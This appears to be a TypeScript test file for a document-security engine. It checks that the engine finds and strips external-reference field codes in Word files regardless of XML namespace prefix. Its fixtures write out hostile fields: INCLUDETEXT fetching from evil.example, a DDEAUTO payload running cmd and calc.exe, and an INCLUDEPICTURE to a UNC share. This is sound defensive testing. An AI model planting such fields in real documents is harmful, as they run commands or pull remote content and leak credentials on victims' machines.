/** visual/references.ts reads field elements by local name, so a package with another WordprocessingML prefix is scanned the same. */
import { describe, expect, it } from 'vitest';
import { AdmZip } from '@attentionform/astra-engine';
import { analyseReferences, neutraliseReferences } from '../../packages/engine/src/visual/references';
import { buildDocx, documentXml } from '../helpers/docx-refs';

const field = (p: string, instr: string): string =>
  `<${p}:p><${p}:r><${p}:fldChar ${p}:fldCharType="begin"/></${p}:r><${p}:r><${p}:instrText xml:space="preserve">${instr}</${p}:instrText></${p}:r><${p}:r><${p}:fldChar ${p}:fldCharType="separate"/></${p}:r><${p}:r><${p}:t>x</${p}:t></${p}:r><${p}:r><${p}:fldChar ${p}:fldCharType="end"/></${p}:r></${p}:p>`;
const simple = (p: string, instr: string): string => `<${p}:p><${p}:fldSimple ${p}:instr="${instr}"><${p}:r><${p}:t>y</${p}:t></${p}:r></${p}:fldSimple></${p}:p>`;
const summary = (docx: Buffer) => {
  const a = analyseReferences(docx, { mutate: false });
  return { found: a.found.map((f) => `${f.class}:${f.scheme ?? ''}`).sort(), local: a.local.length };
};

describe('reference scan under another WordprocessingML prefix', () => {
  const instrs = ['INCLUDETEXT "http://evil.example/a.docx"', 'DDEAUTO cmd "calc.exe"', 'INCLUDEPICTURE "\\\\\\\\host\\\\share\\\\p.png"'];
  for (const prefix of ['x', 'q9']) {
    it(`prefix "${prefix}": complex and simple fields give the same findings as "w"`, () => {
      const build = (p: string) => buildDocx({ document: documentXml(instrs.map((i) => field(p, i)).join('') + simple(p, 'INCLUDETEXT &quot;http://evil.example/b.docx&quot;'), { prefix: p }) });
      const base = summary(build('w'));
      expect(base.found.length).toBeGreaterThanOrEqual(3);
      expect(summary(build(prefix))).toEqual(base);
    });
  }
  it('neutralising a prefixed package removes the network target', () => {
    const docx = buildDocx({ document: documentXml(field('x', 'INCLUDETEXT "http://evil.example/a.docx"'), { prefix: 'x' }) });
    expect(new AdmZip(docx).readAsText('word/document.xml')).toContain('evil.example');
    const out = neutraliseReferences(docx);
    expect(out.changed).toBe(true);
    expect(new AdmZip(out.docx).readAsText('word/document.xml')).not.toContain('evil.example');
  });
});
